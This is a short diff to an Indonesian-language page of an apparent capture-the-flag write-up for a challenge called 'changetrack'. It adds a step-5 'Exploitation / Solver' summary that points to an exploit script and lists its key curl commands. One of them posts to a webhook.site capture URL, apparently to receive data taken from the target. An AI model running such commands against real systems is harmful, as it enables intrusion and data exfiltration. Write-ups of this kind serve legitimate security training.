@@ -2,6 +2,12 @@
 
 [← Overview](48-changetrack.md) · [Index](index.md)
 
+> **Langkah 5/9 — Eksploitasi / Solver.** Script lengkap: assets/changetrack/exploitchangetrack.py.
+>
+> **Titik penting:** curl -sS -c cj -X POST \ · curl -sS -X POST https://webhook.site/token \ · curl -sS -b cj --data-urlencode 'name=GitHub Release Price Tracker' \
+>
+> **Berikutnya:** [Output asli](48-changetrack-06-output-asli.md)
+
 ## 3.1 Strategi
 
 - Login ke workspace admin.
